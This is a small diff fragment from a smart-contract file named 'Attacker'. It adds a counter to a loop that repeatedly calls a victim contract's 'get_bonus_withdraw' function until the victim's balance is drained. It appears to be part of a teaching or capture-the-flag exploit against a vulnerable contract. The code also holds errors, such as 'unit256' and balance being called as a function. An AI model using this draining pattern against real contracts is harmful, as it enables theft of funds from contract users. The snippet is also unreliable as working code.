@@ -26,6 +26,7 @@ contract Attacker {
 		unit256 victim_balance = victim_address.balance(); 
 		while(stolen_gwei + 10 <= victim_balance) {
 			victim_address.get_bonus_withdraw(); 
+			stolen_gwei += 10; 
 		}
 	}
 
